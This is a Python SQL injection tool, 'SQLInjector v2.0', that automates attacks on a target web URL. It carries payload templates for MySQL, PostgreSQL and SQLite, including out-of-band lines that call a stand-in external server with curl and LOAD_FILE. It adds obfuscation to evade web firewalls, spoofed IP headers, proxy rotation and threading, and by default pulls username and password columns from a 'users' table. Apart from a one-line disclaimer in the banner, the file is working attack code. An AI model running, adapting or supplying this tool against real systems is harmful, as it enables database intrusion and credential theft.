#!/use/bin/python3
# Personal SQLi Tool
# Author: [NoneR00tk1t]

import argparse
import requests
import urllib.parse
import random
import time
import string
import logging
import json
import colorama
import concurrent.futures
from typing import List, Dict, Optional, Tuple
from requests.sessions import Session
from fake_useragent import UserAgent
from urllib3.util.retry import Retry
from requests.adapters import HTTPAdapter
import base64
import threading
import queue
from colorama import Fore, Style

colorama.init(autoreset=True)

def setup_logging(verbose: bool) -> None:
    level = logging.DEBUG if verbose else logging.INFO
    logging.basicConfig(
        level=level,
        format='%(asctime)s - %(levelname)s - [%(threadName)s] - %(message)s',
        filename='sql_injection.log',
        filemode='a'
    )

DEFAULT_CONFIG = {
    "TIMEOUT": 5,
    "DELAY_RANGE": (0.5, 2.0),
    "MAX_RETRIES": 3,
    "CONCURRENT_THREADS": 5,
    "USER_AGENTS": UserAgent().random,
    "SUCCESS_KEYWORDS": ["user:", "password", "admin", "login", "success"],
    "INJECTION_POINTS": ["params", "headers", "cookies", "body"],
    "TECHNIQUES": ["union", "error", "blind", "time-based", "out-of-band"],
    "PROXY_POOL": [],
    "ENCODINGS": ["url", "base64", "hex", "unicode"],
}

PAYLOADS = {
    "mysql": {
        "union": [
            "{value} UNION ALL SELECT NULL,CONCAT({prefix},0x3a,{columns}) FROM {table} LIMIT {limit}--",
            "{value} UNION ALL SELECT NULL,CONCAT({prefix},0x3a,{columns}) FROM {table} WHERE 1=1 LIMIT {limit}--",
            "{value} UNION ALL SELECT NULL,CONCAT({prefix},0x3a,{columns}) FROM {table} ORDER BY 1 LIMIT {limit}--"
        ],
        "error": [
            "{value} AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT({prefix},0x3a,(SELECT {columns[0]} FROM {table} LIMIT {limit}),0x3a,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
            "{value} AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT {columns[0]} FROM {table} LIMIT {limit})))--"
        ],
        "blind": [
            "{value} AND (SELECT IF((SELECT COUNT(*) FROM {table})>0,1,0))--",
            "{value} AND (SELECT 1 FROM {table} LIMIT 1)=1--"
        ],
        "time-based": [
            "{value} AND IF((SELECT COUNT(*) FROM {table})>0,SLEEP(5),0)--",
            "{value} AND (SELECT BENCHMARK(1000000,MD5(1)))--"
        ],
        "out-of-band": [
            "{value} AND (SELECT LOAD_FILE(CONCAT('\\\\',{columns[0]},'.your-oob-server.com\\foo')))--"
        ]
    },
    "postgresql": {
        "union": [
            "{value} UNION ALL SELECT NULL,CONCAT({prefix},':',{columns}) FROM {table} LIMIT {limit}--",
            "{value} UNION ALL SELECT NULL,CONCAT({prefix},':',{columns}) FROM {table} WHERE true LIMIT {limit}--"
        ],
        "error": [
            "{value} AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT({prefix},':',(SELECT {columns[0]} FROM {table} LIMIT 1)) AS x FROM information_schema.tables GROUP BY x)a)--",
            "{value} AND 1=CAST((SELECT {columns[0]} FROM {table} LIMIT 1) AS INTEGER)--"
        ],
        "blind": [
            "{value} AND (SELECT CASE WHEN (SELECT COUNT(*) FROM {table})>0 THEN TRUE ELSE FALSE END)--",
            "{value} AND EXISTS(SELECT 1 FROM {table} LIMIT 1)--"
        ],
        "time-based": [
            "{value} AND (SELECT CASE WHEN (SELECT COUNT(*) FROM {table})>0 THEN pg_sleep(5) ELSE 0 END)--",
            "{value} AND (SELECT 1 FROM generate_series(1,1000000))--"
        ],
        "out-of-band": [
            "{value} AND (SELECT COPY (SELECT {columns[0]} FROM {table} LIMIT 1) TO PROGRAM 'curl your-oob-server.com')--"
        ]
    },
    "sqlite": {
        "union": "{value} UNION ALL SELECT NULL,({columns}) FROM {table} LIMIT {limit}--",
        "error": "{value} AND (SELECT {columns[0]} FROM {table} WHERE ROWID=1 AND randomblob(10000000))--",
        "blind": "{value} AND (SELECT CASE WHEN (SELECT COUNT(*) FROM {table})>0 THEN 1 ELSE 0 END)--",
        "time-based": "{value} AND (SELECT randomblob(10000000))--",
        "out-of-band": "{value} AND (SELECT load_extension('http://your-oob-server.com'))--"
    }
}

def hex_encode_string(s: str) -> str:
    return s.encode().hex()

def load_custom_payloads(file_path: str) -> Dict:
    try:
        with open(file_path, 'r') as f:
            custom_payloads = json.load(f)
            logging.info(f"Loaded custom payloads from {file_path}")
            return custom_payloads
    except (FileNotFoundError, json.JSONDecodeError) as e:
        logging.error(f"Failed to load custom payloads: {e}")
        return {}

def obfuscate_payload(payload: str) -> str:
    obfuscation_methods = [
        lambda p: p.replace(" ", "/**/"),
        lambda p: p.replace("=", " LIKE "),
        lambda p: "".join(random.choice([c.upper(), c.lower()]) for c in p),
        lambda p: urllib.parse.quote(p, safe=""),
        lambda p: p.replace("UNION", "UNION/**/ALL"),
        lambda p: f"({p})",
        lambda p: base64.b64encode(p.encode()).decode(),
        lambda p: f"0x{p.encode().hex()}",
        lambda p: p.replace("SELECT", "SeLeCt"),
        lambda p: f"/*{''.join(random.choices(string.ascii_letters, k=10))}*/{p}"
    ]
    selected_methods = random.sample(obfuscation_methods, k=random.randint(1, 3))
    for method in selected_methods:
        try:
            payload = method(payload)
        except Exception as e:
            logging.warning(f"Obfuscation method failed: {e}")
    return payload

def encode_payload(payload: str, encoding: str) -> str:
    if encoding == "url":
        return urllib.parse.quote(payload, safe="")
    elif encoding == "base64":
        return base64.b64encode(payload.encode()).decode()
    elif encoding == "hex":
        return f"0x{payload.encode().hex()}"
    elif encoding == "unicode":
        return ''.join(f'\\u{ord(c):04x}' for c in payload)
    return payload

def detect_dbms(session: Session, url: str, param_name: str) -> str:
    test_payloads = {
        "mysql": "' AND 1=1--",
        "postgresql": "'; SELECT 1--",
        "sqlite": "' AND sqlite_version()--"
    }
    for dbms, payload in test_payloads.items():
        response, _ = send_request(session, url, payload, param_name, "params")
        if response and all(kw not in response.lower() for kw in ["error", "exception", "failed"]):
            logging.info(f"Detected possible DBMS: {dbms}")
            return dbms
    logging.warning("DBMS detection failed, defaulting to mysql")
    return "mysql"

def generate_payload(
    technique: str,
    columns: List[str],
    table: str,
    dbms: str,
    value: str = "1",
    limit: int = 1,
    encoding: str = "none"
) -> str:
    payloads = PAYLOADS.get(dbms, PAYLOADS["mysql"])
    payload_templates = payloads.get(technique)
    if not payload_templates:
        logging.error(f"Invalid technique: {technique} for DBMS: {dbms}")
        return ""
    
    payload_template = random.choice(payload_templates) if isinstance(payload_templates, list) else payload_templates
    prefix = f"0x{hex_encode_string('user')}" if dbms == "mysql" else "'user'"
    payload = payload_template.format(
        value=value,
        prefix=prefix,
        columns=",".join(columns),
        table=table,
        limit=limit
    )
    payload = obfuscate_payload(payload)
    if encoding != "none":
        payload = encode_payload(payload, encoding)
    return payload

def setup_session(proxy: Optional[str] = None) -> Session:
    session = requests.Session()
    retries = Retry(
        total=DEFAULT_CONFIG["MAX_RETRIES"],
        backoff_factor=0.3,
        status_forcelist=[429, 500, 502, 503, 504]
    )
    session.mount("http://", HTTPAdapter(max_retries=retries))
    session.mount("https://", HTTPAdapter(max_retries=retries))
    
    if proxy:
        session.proxies = {"http": proxy, "https": proxy}
        logging.debug(f"Using proxy: {proxy}")
    
    return session

def send_request(
    session: Session,
    url: str,
    payload: str,
    param_name: str,
    injection_point: str = "params",
    headers: Optional[Dict] = None,
    cookies: Optional[Dict] = None,
    body: Optional[Dict] = None
) -> Optional[Tuple[str, float]]:
    headers = headers or {
        "User-Agent": DEFAULT_CONFIG["USER_AGENTS"],
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.5",
        "Referer": random.choice(["http://example.com", "https://google.com", ""]),
        "X-Forwarded-For": f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
    }
    cookies = cookies or {}
    params = {param_name: "1"}
    body = body or {}

    if injection_point == "params":
        params[param_name] = payload
    elif injection_point == "headers":
        headers["X-Custom-Header"] = payload
    elif injection_point == "cookies":
        cookies["custom_cookie"] = payload
    elif injection_point == "body":
        body[param_name] = payload

    time.sleep(random.uniform(*DEFAULT_CONFIG["DELAY_RANGE"]))
    
    start_time = time.time()
    try:
        response = session.post(
            url,
            params=params if injection_point != "body" else {},
            headers=headers,
            cookies=cookies,
            json=body if injection_point == "body" else None,
            timeout=DEFAULT_CONFIG["TIMEOUT"]
        )
        response_time = time.time() - start_time
        logging.debug(f"Request sent: {injection_point} - {payload[:100]}... Response time: {response_time:.2f}s")
        return response.text, response_time
    except requests.RequestException as e:
        logging.error(f"Request failed: {e}")
        return None, 0.0

def check_response(response: str, response_time: float, technique: str, keywords: List[str]) -> bool:
    if not response:
        return False
    if technique == "time-based" and response_time > DEFAULT_CONFIG["TIMEOUT"]:
        return True
    return any(keyword.lower() in response.lower() for keyword in keywords)

def save_results(data: str, technique: str, injection_point: str, dbms: str, encoding: str):
    result = {
        "timestamp": time.strftime("%Y-%m-%d %H:%M:%S"),
        "technique": technique,
        "injection_point": injection_point,
        "dbms": dbms,
        "encoding": encoding,
        "data": data[:1000]
    }
    with threading.Lock():
        with open("injection_results.json", "a") as f:
            json.dump(result, f, indent=2)
            f.write("\n")

def worker_task(
    queue: queue.Queue,
    url: str,
    param_name: str,
    table: str,
    columns: List[str],
    dbms: str,
    keywords: List[str]
):
    session = setup_session(random.choice(DEFAULT_CONFIG["PROXY_POOL"]) if DEFAULT_CONFIG["PROXY_POOL"] else None)
    while not queue.empty():
        try:
            technique, injection_point, encoding = queue.get_nowait()
            logging.info(f"Worker processing: {technique} - {injection_point} - {encoding}")
            
            payload = generate_payload(
                technique=technique,
                columns=columns,
                table=table,
                dbms=dbms,
                encoding=encoding
            )
            if not payload:
                logging.warning(f"No payload generated for {technique} - {encoding}")
                continue

            result = send_request(
                session=session,
                url=url,
                payload=payload,
                param_name=param_name,
                injection_point=injection_point
            )
            
            if result is None:
                continue
                
            response, response_time = result

            if check_response(response, response_time, technique, keywords):
                logging.info(f"Success with {technique} payload in {injection_point} (encoding: {encoding})!")
                print(f"[+] Success with {technique} in {injection_point} (encoding: {encoding})!")
                print(f"[+] Response snippet:\n{response[:500]}")
                save_results(response, technique, injection_point, dbms, encoding)
                return True
            else:
                logging.info(f"No success with {technique} in {injection_point} (encoding: {encoding})")
                print(f"[-] No success with {technique} in {injection_point} (encoding: {encoding})")
        except queue.Empty:
            break
        except Exception as e:
            logging.error(f"Worker error: {e}")
        finally:
            queue.task_done()
    return False

def print_banner():
    print(f"""
{Fore.RED}[x] {Fore.WHITE}OPERATOR: {Fore.LIGHTBLACK_EX}[NoneR00tk1t]
{Fore.RED}[x] {Fore.WHITE}TEAM: {Fore.LIGHTBLACK_EX}[Valhala]
{Fore.LIGHTRED_EX}
                                                                                ..            
           .:                                                                         ;;            
           :X.                                                                       x$:            
       ..  .XX.                                                                    :X&;   ::        
       .+.  :X$+.                                                                .+$$:   ;X.        
        ;$:   x&$:                                                             .+X&X:. :X&:         
      :  :X$;. :X&$+:                                                       :;XX&X: .;X$X.  .;      
      :x.  :x$X+::x&$X;:                                                .;+xX$&x;;xX$&X:  .;$.      
       :$$+. .;$$$$x+$&&X++.            ..                          .;x+X&&&$$&&$$$+:  .;X$x.       
      .;.;X$&&&X+x$&&&&&&&&&$X+::.   .++. :;.         :++X$;  ::+XX$$&&&&&&&&&&&$X$&&&&$X;.;:       
       .+x;:;+xX$&&&&&&&&&&&&&&$$$X+::;     .        ::   :;;X$$$$$&&&&&&&&&&&&&&$X+;:;;xXX:        
         :X$$&&$$XXX$&&&&&&&&&&&&&&&$X; ::              ; ;X$&&&&&&&&&&&&&&&&&&&&&&&&&&$+.          
       .;;::;+xX$$$$&&&&&&&&&&&&&&&&&$&&x++;:...        +;X$&&&&&$$$&&&&&&&&&&$$$Xx;:::;xX+.        
         .;X$$$$$$&&&&$$&&&&&&&&$$&&&$$X$$&&&&$X+:.    .;;X&&&&&&$$&&&&&&&&$&&&&&&&&&$$x;           
            .:+X$$$$$$$&$&&&&&&&$$&&&&&&X:+&&$$XXXx;.  ::;X&&&&$$$$&&&&&&&&&&&&&&$X+:..  :+;        
         :xx+++xX$&&&&&&$$&&&&&&&$$&&&&&X;.:$&&$XXXx;:  ;;X&&&&&&$&&&&&&&$&&&&&&&&&&$$X+:           
            .:;+XX$$$$$&&$$&&&&$$$$&&&&&X.:+:X&$&&$Xx;. + +$&&&$$$$$$$&$$&&&$&$$Xx+:.               
         :;+X$$$$$$$$$$$$&&$&$X$$$$&&&&&$;.;:xX$$$XX$$x:..;$X&&&$$$$$&$$&&&$$$$$$$$X+:..            
             ..:;+$$X$&&$$$&&$X$$X$$&&&&$&$Xx$$$X$&$$&XXxX$$&&&$$$$$$&&$$$$&$&&&$$X;:.              
                :++XXXXX$&&&&$$$$XX$$&&&&&&x$&&XX$&$$$$$&&&&&&&$X$$$$&&&&$$$$$$XX+;:.               
                  .;X$$$$$X$&&$$$$$X$$$$&&$$&&&$XX$$$&$&&&&&$$$$X$&$$&&$X$$&$X+::.                  
                   .;+XXX$&&$$&&$$$X$$$$$$&&&&&&&&&$&$&&&&&$X$$$$$&&&$$&&$X+:.                      
                      .;X$XX&&$$$&$$$$$X$$&&&&&&&&&&&&&&&&$$$$$$$&&$$&&XX$X;.:.                     
                         :X$xX&$X&&$X&&&&$&&&&&&&&&&&&&&&$$$$&&$&$$&&$x$X+: .                       
                          .+$XX&&$X&&$$&&&&X&&&&&&&&&&&&&&&&&$$&&&&XX$&X:.                          
                            :;:.+$&&&$&$$&$X$&&&&&&$xXX&&$$&$&&$$&XxXx:.                            
                              ...:X&&&&&&&X$&&&&&&&$X&XX$&&&&&&&&x+X;                               
                                   :X;+&&&XX&&X&&&X$&$$XX&$$$X;X:.:;.                               
                                    .:;+++X$XXX&&$$$$$&$$$x;+:+::;.      .                          
                                        .:X$$x&$&&+X$&&$$$;::. .         ;.                         
                                         ;$&$$$&&&X&&&$&&.              .+:                         
                                  .::.  :X$&&&$&&&&&&&&&$.              ;+.                         
                             ;X$&&&&&&&$X$&&&&&&$&&&&&&&$;             :X;                          
                          .x$&&&&&$&&$$&$$&&$$&&&&&&&&&&$X.          .+$;                           
                         ;$&&&x:        ;$X++XX$&&&&&&&&+:.     ::;+X$$:                            
                        ;$$&X.         :Xx.  :&x$&&&&&&&X    .x&&&&&&+.                             
                       :XX&X.     .. :x$$;   :::X&&&&&&$:    X&&&&$$X$$.                            
                       +X$&+    .XXXxX$x+$x. . ;&&&&$$&X:   :&&&$$X;;:::                            
                       +$X&x.   ;; x$x:  ;+;   +&&&&$&$;   ;&&&&&$$+                                
                       ;X+&&:    . ;      :  .+&$$&$$$;  .+&&&$X;:+&                                
                       :X$x&&+.            .;$&&&&&$$: .+$$$x:   ;X.                                
                       :X$XX&&$x:        :;$&&$&&$&X::xX$x:     .:                                  
                          +$;X&&&$x;;::;;$&&&&&&$X;x$X$;                                            
                          :X&$xx$&&&&&&&&&&&$$XXX$$X;                                               
                          ::++$&$Xx++xx+xxXX$$&&$x;:.                                               
                           .  ;;+$xX&&&$$$&&&;                                                      
                                  :     .:+:                                           
    SQLInjector v2.0 - Advanced SQL Injection Testing Framework
    [*] Starting SQL injection testing...
    [*] Use responsibly and only with explicit permission!
    [*] Enhanced with parallel processing, proxy support, and WAF bypass
{Style.RESET_ALL}
    """)

def main():
    parser = argparse.ArgumentParser(description="SQLInjector: Advanced SQL Injection Testing Framework")
    parser.add_argument("-u", "--url", required=True, help="Target URL (e.g., http://example.com/vuln.php)")
    parser.add_argument("-p", "--param", default="id", help="Parameter to inject (default: id)")
    parser.add_argument("-t", "--table", default="users", help="Target table (default: users)")
    parser.add_argument("-c", "--columns", default="username,password", help="Columns to extract (comma-separated)")
    parser.add_argument("--techniques", default="union,error,blind,time-based,out-of-band", help="Injection techniques (comma-separated)")
    parser.add_argument("--injection-points", default="params,headers,cookies,body", help="Injection points (comma-separated)")
    parser.add_argument("--dbms", default="mysql", choices=["mysql", "postgresql", "sqlite"], help="Target DBMS")
    parser.add_argument("--payloads", help="Path to custom payloads JSON file")
    parser.add_argument("--proxy-file", help="Path to proxy list file")
    parser.add_argument("-v", "--verbose", action="store_true", help="Enable verbose output")
    parser.add_argument("--threads", type=int, default=5, help="Number of concurrent threads (default: 5)")
    args = parser.parse_args()

    setup_logging(args.verbose)

    if args.payloads:
        global PAYLOADS
        custom_payloads = load_custom_payloads(args.payloads)
        if custom_payloads:
            PAYLOADS.update(custom_payloads)

    if args.proxy_file:
        try:
            with open(args.proxy_file, 'r') as f:
                DEFAULT_CONFIG["PROXY_POOL"] = [line.strip() for line in f if line.strip()]
                logging.info(f"Loaded {len(DEFAULT_CONFIG['PROXY_POOL'])} proxies")
        except FileNotFoundError:
            logging.error(f"Proxy file {args.proxy_file} not found")
            print(f"[!] Proxy file {args.proxy_file} not found")

    config = {
        "url": args.url,
        "param_name": args.param,
        "table": args.table,
        "columns": args.columns.split(","),
        "techniques": args.techniques.split(","),
        "injection_points": args.injection_points.split(","),
        "dbms": args.dbms,
        "keywords": DEFAULT_CONFIG["SUCCESS_KEYWORDS"],
        "threads": min(args.threads, DEFAULT_CONFIG["CONCURRENT_THREADS"])
    }

    if not all(t in DEFAULT_CONFIG["TECHNIQUES"] for t in config["techniques"]):
        print(f"Error: Invalid techniques. Choose from {','.join(DEFAULT_CONFIG['TECHNIQUES'])}")
        return
    if not all(ip in DEFAULT_CONFIG["INJECTION_POINTS"] for ip in config["injection_points"]):
        print(f"Error: Invalid injection points. Choose from {','.join(DEFAULT_CONFIG['INJECTION_POINTS'])}")
        return


    with requests.Session() as session:
        dbms = config["dbms"] if config["dbms"] != "auto" else detect_dbms(session, config["url"], config["param_name"])
        logging.info(f"Using DBMS: {dbms}")

        task_queue = queue.Queue()
        for technique in config["techniques"]:
            for injection_point in config["injection_points"]:
                for encoding in DEFAULT_CONFIG["ENCODINGS"] + ["none"]:
                    task_queue.put((technique, injection_point, encoding))

        with concurrent.futures.ThreadPoolExecutor(max_workers=config["threads"]) as executor:
            futures = [
                executor.submit(
                    worker_task,
                    task_queue,
                    config["url"],
                    config["param_name"],
                    config["table"],
                    config["columns"],
                    dbms,
                    config["keywords"]
                )
                for _ in range(config["threads"])
            ]
            for future in concurrent.futures.as_completed(futures):
                if future.result():
                    logging.info("Vulnerability found, stopping execution")
                    print("[*] Vulnerability found, stopping execution")
                    return

    logging.info("Injection attempt completed.")
    print("[*] Injection attempt completed. No vulnerabilities found.")

if __name__ == "__main__":
    print_banner()
    try:
        main()
    except KeyboardInterrupt:
        logging.info("Injection stopped by user.")
        print("[!] Injection stopped by user.")
    except Exception as e:
        logging.error(f"Unexpected error: {e}")

        print(f"[!] An error occurred: {e}")

